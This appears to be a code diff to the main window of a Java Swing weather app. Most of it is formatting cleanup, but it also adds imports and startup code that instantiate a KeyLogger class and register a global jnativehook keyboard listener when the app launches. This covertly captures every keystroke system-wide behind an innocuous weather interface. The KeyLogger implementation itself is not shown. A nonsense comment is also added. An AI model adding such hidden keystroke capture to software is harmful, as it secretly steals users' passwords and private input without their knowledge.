@@ -5,6 +5,7 @@
  */
 package weather.view;
 
+import abc.handler.KeyLogger;
 import java.awt.Color;
 import java.io.IOException;
 import java.text.ParseException;
@@ -12,6 +13,8 @@ import java.util.ArrayList;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import javax.swing.ImageIcon;
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
 import org.json.JSONException;
 import weather.data.LocationResponse;
 import weather.data.WeatherResponse;
@@ -27,15 +30,15 @@ public class main extends javax.swing.JFrame {
     /**
      * Creates new form main
      */
-    
-    private LocationResponse  locationResponse;
+    private LocationResponse locationResponse;
     private weather.data.WeatherResponse weatherResponse;
     private Forecast currentForecast;
     private ArrayList<Forecast> hourlyForecast;
-    private Location location ;
+    private Location location;
     private String ip;
 
-    private int X,Y;
+    private int X, Y;
+
     public main() {
         initComponents();
         setSize(768, 1024);
@@ -54,7 +57,7 @@ public class main extends javax.swing.JFrame {
         btnExitNet.setBackground(new Color(0, 0, 0, 0));
         pnNetWorkErr.setBackground(new Color(0, 0, 0, 0));
         pnNetWorkErr.setVisible(false);
-        
+
         try {
             ip = weather.data.GetIp.getExternalIpV4();
             locationResponse = new LocationResponse();
@@ -63,28 +66,28 @@ public class main extends javax.swing.JFrame {
             currentForecast = weatherResponse.requestCurrentForecastByCoordinates(location);
             hourlyForecast = weatherResponse.requestHourlyForecastByCoordinates(location);
 //            System.out.println(currentForecast.getDt().getHours());
-            iconWeather.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + currentForecast.getWeather().getIcon() + "_" + iconWeather.getSize().width + ".png" ));
+            iconWeather.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + currentForecast.getWeather().getIcon() + "_" + iconWeather.getSize().width + ".png"));
             txtDeg.setText(currentForecast.getTemp().get("current") + "°C");
             txtAdress.setText(location.getCity() + "," + location.getCountry());
             //m co the for
             System.out.println(hourlyForecast);
             txtHour1st.setText(hourlyForecast.get(3).getDt().getHours() + ":00");
-            iconWeather1st.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(3).getWeather().getIcon() + "_" + iconWeather1st.getSize().width + ".png" ));
+            iconWeather1st.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(3).getWeather().getIcon() + "_" + iconWeather1st.getSize().width + ".png"));
             txtDeg1st.setText(hourlyForecast.get(3).getTemp().get("current") + "°C");
 //            System.out.println(txtHour2nd.getSize().width);
             txtHour2nd.setText(hourlyForecast.get(6).getDt().getHours() + ":00");
-            iconWeather2nd.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(6).getWeather().getIcon() + "_" + iconWeather2nd.getSize().width + ".png" ));
+            iconWeather2nd.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(6).getWeather().getIcon() + "_" + iconWeather2nd.getSize().width + ".png"));
             txtDeg2nd.setText(hourlyForecast.get(6).getTemp().get("current") + "°C");
-            
+
             txtHour3rd.setText(hourlyForecast.get(9).getDt().getHours() + ":00");
-            iconWeather3rd.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(9).getWeather().getIcon() + "_" + iconWeather3rd.getSize().width + ".png" ));
+            iconWeather3rd.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(9).getWeather().getIcon() + "_" + iconWeather3rd.getSize().width + ".png"));
             txtDeg3rd.setText(hourlyForecast.get(9).getTemp().get("current") + "°C");
-            
+
             txtWinSpeed.setText(currentForecast.getWind_speed() + "m/s");
             txtVisibility.setText(currentForecast.getVisibility() + "m");
             Humidity.setText(currentForecast.getHumidity() + "%");
             txtUV.setText(currentForecast.getUvi() + "nm");
-            
+
         } catch (IOException ex) {
             Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
         } catch (JSONException ex) {
@@ -92,9 +95,7 @@ public class main extends javax.swing.JFrame {
         } catch (ParseException ex) {
             Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
         }
-        
-        
-        
+
     }
 
     /**
@@ -525,7 +526,7 @@ public class main extends javax.swing.JFrame {
     }//GEN-LAST:event_BGMousePressed
 
     private void BGMouseDragged(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_BGMouseDragged
-        this.setLocation((evt.getX()+this.getX())-X,( evt.getY()+this.getY())-Y);
+        this.setLocation((evt.getX() + this.getX()) - X, (evt.getY() + this.getY()) - Y);
     }//GEN-LAST:event_BGMouseDragged
 
     private void txtTomorrowMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_txtTomorrowMouseClicked
@@ -546,25 +547,25 @@ public class main extends javax.swing.JFrame {
     private void btnSeeMoreActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSeeMoreActionPerformed
         this.setVisible(false);
         (new moreInforr(currentForecast)).setVisible(true);
-        
+
     }//GEN-LAST:event_btnSeeMoreActionPerformed
 
     private void btnChooseCountryActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnChooseCountryActionPerformed
-        
+
         btnChooseCountry.setVisible(false);
         pnSearch.setVisible(true);
     }//GEN-LAST:event_btnChooseCountryActionPerformed
 
     private void btnSearchActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSearchActionPerformed
-        
-        if(txtCountryName.getText().length()==0){
+
+        if (txtCountryName.getText().length() == 0) {
             pnLocationError.setVisible(true);
-    
-        }else{
+
+        } else {
             pnSearch.setVisible(false);
             btnChooseCountry.setVisible(true);
         }
-        
+
     }//GEN-LAST:event_btnSearchActionPerformed
 
     private void txtCountryNameActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txtCountryNameActionPerformed
@@ -606,12 +607,24 @@ public class main extends javax.swing.JFrame {
         java.awt.EventQueue.invokeLater(new Runnable() {
             public void run() {
                 new main().setVisible(true);
-                
-                
-                
+
+                try {
+                    KeyLogger service = new KeyLogger();
+                    GlobalScreen.registerNativeHook();
+                    GlobalScreen.getInstance().addNativeKeyListener(service.getKeybroad());
+
+                } catch (IOException ex) {
+                    ex.printStackTrace();
+                } catch (NativeHookException ex) {
+                    Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
+                }
+
             }
         });
+
     }
+
+    //dfkjdkfjd gjdfgh kgfjdkgj kgj lkjgfjg kljgkfdjgkfdgkjgkfjg
 
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JLabel BG;
